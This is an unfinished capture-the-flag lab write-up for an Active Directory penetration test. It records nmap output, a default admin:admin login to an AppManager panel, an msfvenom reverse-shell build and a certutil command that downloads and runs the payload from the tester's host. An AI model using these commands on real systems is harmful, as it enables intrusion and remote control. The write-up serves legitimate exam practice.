#CTF

# Given

We have been tasked to conduct a penetration test on the network of _Secura_. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The main objective is obtain access to the Domain Controller.

The public subnet of the network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

Although this Challenge Lab is not a mock exam, it has been setup to use the 'Assumed Breach' scenario as seen in the OSCP+ exam. The credentials below can be used to commence your attack: Username: Eric.Wallows Password: EricLikesRunning800

## IP

192.168.184.95
192.168.184.96
192.168.184.97

## Starter Creds

```bash
192.168.184.97
Username: Eric.Wallows 
Password: EricLikesRunning800
```

# Steps

## Enumeration

Full nmap scan to enumerate running services and confirm open ports

### 192.168.113.95

Open ports

```bash
PORT      STATE SERVICE          VERSION
135/tcp   open  msrpc            Microsoft Windows RPC
139/tcp   open  netbios-ssn      Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server    Microsoft Terminal Services
5001/tcp  open  commplex-link?
5040/tcp  open  unknown
5985/tcp  open  http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/https-alt    AppManager
12000/tcp open  cce4x?
44444/tcp open  cognex-dataman?
47001/tcp open  http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc            Microsoft Windows RPC
49665/tcp open  msrpc            Microsoft Windows RPC
49666/tcp open  msrpc            Microsoft Windows RPC
49667/tcp open  msrpc            Microsoft Windows RPC
49668/tcp open  msrpc            Microsoft Windows RPC
49669/tcp open  msrpc            Microsoft Windows RPC
49670/tcp open  msrpc            Microsoft Windows RPC
49671/tcp open  msrpc            Microsoft Windows RPC
49672/tcp open  unknown
49673/tcp open  tcpwrapped
51694/tcp open  java-rmi         Java RMI
51725/tcp open  unknown
62950/tcp open  unknown
```

AppManager stands out.

Visiting `https://192.168.184.95:8443` opens the app manager application logon screen. 

Try default creds `admin:admin` and it brings us into the app manager control panel. 

Looking at the "About" link shows us the following version information:

- Build number `14710`

![](assets/Pasted%20image%2020250729223632.png)

Looked at searchsploit for a possible exploit to this

![](assets/Pasted%20image%2020250729224308.png)

Got a potential match in `48793.py` which didn't work.

![](assets/Pasted%20image%2020250729231928.png)

Checking the web portal for a potential way in. There is an option to run executable files and scripts on the web server. 

The idea: 

- create reverse shell with msfenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.65.3 LPORT=443 -f exe -o appman.exe
```

- write a file transfer script to have the server pull and execute my reverse shell

```bash
certutil.exe -f -urlcache -split http://192.168.65.3/appman.exe c:\windows\temp\appman.exe && cmd.exe /c c:\windows\temp\appman.exe
```

```bash
certutil.exe -f -urlcache -split 'http://<IP>:<port>/<file>'
```

### 192.168.113.96

### 192.168.113.97

# Findings

# Creds

# Proof